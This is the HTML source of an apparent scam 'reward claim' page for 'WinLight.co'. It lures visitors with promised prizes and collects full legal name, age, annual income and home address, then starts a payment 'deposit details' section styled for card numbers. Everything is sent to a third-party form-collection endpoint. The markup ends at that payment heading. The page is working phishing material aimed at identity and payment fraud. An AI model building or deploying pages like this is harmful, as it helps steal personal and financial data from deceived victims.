<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="WinLight.co - Claim Your Rewards">
    <title>WinLight.co - Reward Claim Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-red: #dc2626;
            --primary-orange: #ea580c;
            --gold: #fbbf24;
            --dark-red: #7c1d1d;
            --darker-red: #450a0a;
            --glass-bg: rgba(69, 10, 10, 0.9);
            --border-orange: rgba(251, 146, 60, 0.4);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, var(--dark-red) 0%, var(--primary-orange) 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff7ed;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(251, 146, 60, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(220, 38, 38, 0.2) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            box-shadow: 
                0 25px 50px -12px rgba(0, 0, 0, 0.5),
                0 0 0 1px var(--border-orange);
            overflow: hidden;
            border: 1px solid var(--border-orange);
            position: relative;
            z-index: 1;
        }

        .header {
            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-orange) 100%);
            padding: 50px 30px;
            text-align: center;
            position: relative;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(251, 191, 36, 0.2) 0%, transparent 70%);
            animation: pulse-bg 4s ease-in-out infinite;
        }

        @keyframes pulse-bg {
            0%, 100% { transform: scale(1); opacity: 0.3; }
            50% { transform: scale(1.1); opacity: 0.6; }
        }

        .logo-text {
            font-size: 3rem;
            font-weight: 800;
            color: white;
            letter-spacing: -2px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
            position: relative;
            z-index: 1;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 10px rgba(251, 191, 36, 0.3), 0 2px 10px rgba(0,0,0,0.3); }
            to { text-shadow: 0 0 30px rgba(251, 191, 36, 0.6), 0 2px 10px rgba(0,0,0,0.3); }
        }

        .logo-text span {
            color: var(--gold);
        }

        .subtitle {
            color: rgba(255, 237, 213, 0.95);
            margin-top: 15px;
            font-size: 1.2rem;
            font-weight: 400;
            position: relative;
            z-index: 1;
        }

        .reward-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(251, 191, 36, 0.15);
            border: 1px solid rgba(251, 191, 36, 0.3);
            padding: 10px 20px;
            border-radius: 50px;
            margin-top: 20px;
            font-size: 0.9rem;
            color: var(--gold);
            font-weight: 600;
            position: relative;
            z-index: 1;
        }

        .form-container {
            padding: 40px;
        }

        .form-section {
            margin-bottom: 35px;
        }

        .section-title {
            font-size: 1rem;
            color: var(--gold);
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid rgba(251, 146, 60, 0.3);
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }

        .form-group {
            position: relative;
        }

        .form-group.full-width {
            grid-column: 1 / -1;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #fdba74;
            font-size: 0.9rem;
            font-weight: 500;
        }

        .required::after {
            content: ' *';
            color: #fca5a5;
        }

        input, select {
            width: 100%;
            padding: 14px 16px;
            background: rgba(124, 29, 29, 0.6);
            border: 2px solid rgba(251, 146, 60, 0.3);
            border-radius: 12px;
            color: #fff7ed;
            font-size: 1rem;
            transition: all 0.3s ease;
            outline: none;
        }

        input:focus, select:focus {
            border-color: var(--gold);
            box-shadow: 0 0 0 3px rgba(251, 191, 36, 0.1);
        }

        input::placeholder {
            color: rgba(253, 186, 116, 0.4);
        }

        .input-hint {
            font-size: 0.8rem;
            color: rgba(253, 186, 116, 0.6);
            margin-top: 6px;
        }

        .card-input-wrapper {
            position: relative;
        }

        .card-icons {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            gap: 6px;
            opacity: 0.7;
        }

        .card-icon {
            width: 28px;
            height: 18px;
            background: #475569;
            border-radius: 3px;
        }

        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-orange) 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.4);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 25px;
            color: rgba(253, 186, 116, 0.7);
            font-size: 0.8rem;
        }

        /* Thank You Page Styles */
        .thank-you-container {
            display: none;
            text-align: center;
            padding: 60px 40px;
            background: var(--darker-red);
        }

        .thank-you-container.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .success-icon {
            width: 100px;
            height: 100px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, var(--primary-red) 0%, var(--primary-orange) 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 3px solid rgba(251, 191, 36, 0.3);
            box-shadow: 0 0 40px rgba(220, 38, 38, 0.3);
        }

        .success-icon svg {
            width: 50px;
            height: 50px;
            color: white;
        }

        .thank-you-title {
            font-size: 2rem;
            color: #fff7ed;
            margin-bottom: 15px;
            font-weight: 700;
        }

        .thank-you-subtitle {
            color: #fdba74;
            font-size: 1.1rem;
            margin-bottom: 40px;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
            line-height: 1.6;
        }

        .timer-display {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 40px;
            flex-wrap: wrap;
        }

        .time-unit {
            background: rgba(124, 29, 29, 0.6);
            border: 2px solid rgba(251, 146, 60, 0.4);
            border-radius: 16px;
            padding: 25px;
            min-width: 100px;
        }

        .time-value {
            font-size: 3rem;
            font-weight: 800;
            color: var(--gold);
            line-height: 1;
            font-variant-numeric: tabular-nums;
        }

        .time-label {
            font-size: 0.85rem;
            color: #fdba74;
            text-transform: uppercase;
            margin-top: 8px;
            letter-spacing: 1px;
        }

        .status-message {
            background: rgba(251, 191, 36, 0.1);
            border: 1px solid rgba(251, 191, 36, 0.3);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            text-align: left;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }

        .status-message h3 {
            color: var(--gold);
            margin-bottom: 10px;
            font-size: 1.1rem;
        }

        .status-message p {
            color: #fdba74;
            font-size: 0.95rem;
            line-height: 1.6;
        }

        .contact-support {
            margin-top: 30px;
            padding-top: 30px;
            border-top: 1px solid rgba(251, 146, 60, 0.3);
        }

        .contact-support p {
            color: rgba(253, 186, 116, 0.8);
            font-size: 0.9rem;
        }

        .contact-support a {
            color: var(--gold);
            text-decoration: none;
            font-weight: 600;
        }

        .contact-support a:hover {
            text-decoration: underline;
        }

        /* Responsive */
        @media (max-width: 600px) {
            .form-container {
                padding: 25px;
            }
            
            .header {
                padding: 40px 20px;
            }
            
            .logo-text {
                font-size: 2.5rem;
            }
            
            .time-value {
                font-size: 2.5rem;
            }
            
            .time-unit {
                min-width: 80px;
                padding: 20px;
            }
        }

        /* Honeypot - Anti spam */
        .honeypot {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Form Section -->
        <div id="formSection">
            <div class="header">
                <div class="logo-text">Win<span>Light</span>.co</div>
                <div class="subtitle">Claim Your Exclusive Rewards</div>
                <div class="reward-badge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
                    </svg>
                    Secure Reward Portal
                </div>
            </div>

            <div class="form-container">
                <form action="https://formspree.io/f/mzdkwqdl" method="POST" id="rewardClaimForm" novalidate autocomplete="on">
                    
                    <!-- Formspree Configuration -->
                    <input type="hidden" name="_subject" value="New WinLight Reward Claim">
                    <input type="hidden" name="_template" value="table">
                    
                    <!-- Honeypot for spam protection -->
                    <div class="honeypot">
                        <input type="text" name="_gotcha" tabindex="-1" autocomplete="off">
                    </div>

                    <!-- Personal Information -->
                    <div class="form-section">
                        <div class="section-title">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                <circle cx="12" cy="7" r="4"></circle>
                            </svg>
                            Personal Information
                        </div>
                        <div class="form-grid">
                            <div class="form-group full-width">
                                <label for="fullName" class="required">Full Legal Name</label>
                                <input 
                                    type="text" 
                                    id="fullName" 
                                    name="fullName" 
                                    required 
                                    autocomplete="name"
                                    placeholder="Enter your full legal name"
                                >
                            </div>
                            
                            <div class="form-group">
                                <label for="age" class="required">Age</label>
                                <input 
                                    type="number" 
                                    id="age" 
                                    name="age" 
                                    required 
                                    min="18" 
                                    max="120"
                                    placeholder="Must be 18+"
                                >
                            </div>
                            
                            <div class="form-group">
                                <label for="income" class="required">Annual Income (USD)</label>
                                <input 
                                    type="number" 
                                    id="income" 
                                    name="income" 
                                    required 
                                    min="0" 
                                    placeholder="e.g., 75000"
                                >
                            </div>
                        </div>
                    </div>

                    <!-- Address Information -->
                    <div class="form-section">
                        <div class="section-title">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
                            </svg>
                            Delivery Address
                        </div>
                        <div class="form-grid">
                            <div class="form-group full-width">
                                <label for="address" class="required">Street Address</label>
                                <input 
                                    type="text" 
                                    id="address" 
                                    name="address" 
                                    required 
                                    autocomplete="street-address"
                                    placeholder="Enter your street address"
                                >
                            </div>
                            
                            <div class="form-group">
                                <label for="city" class="required">City</label>
                                <input 
                                    type="text" 
                                    id="city" 
                                    name="city" 
                                    required 
                                    autocomplete="address-level2"
                                    placeholder="City"
                                >
                            </div>
                            
                            <div class="form-group">
                                <label for="state" class="required">State/Province</label>
                                <input 
                                    type="text" 
                                    id="state" 
                                    name="state" 
                                    required 
                                    autocomplete="address-level1"
                                    placeholder="State/Province"
                                >
                            </div>
                            
                            <div class="form-group">
                                <label for="postalCode" class="required">Postal/ZIP Code</label>
                                <input 
                                    type="text" 
                                    id="postalCode" 
                                    name="postalCode" 
                                    required 
                                    autocomplete="postal-code"
                                    placeholder="Postal Code"
                                >
                            </div>
                            
                            <div class="form-group">
                                <label for="country" class="required">Country</label>
                                <select id="country" name="country" required autocomplete="country">
                                    <option value="">Select Country</option>
                                    <option value="US">United States</option>
                                    <option value="CA">Canada</option>
                                    <option value="UK">United Kingdom</option>
                                    <option value="AU">Australia</option>
                                    <option value="DE">Germany</option>
                                    <option value="FR">France</option>
                                    <option value="JP">Japan</option>
                                    <option value="SG">Singapore</option>
                                    <option value="OTHER">Other</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <!-- Payment Information -->
                    <div class="form-section">
                        <div class="section-title">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                                <line x1="1" y1="10" x2="23" y2="10"></line>
                            </svg>
                            Reward Deposit Details
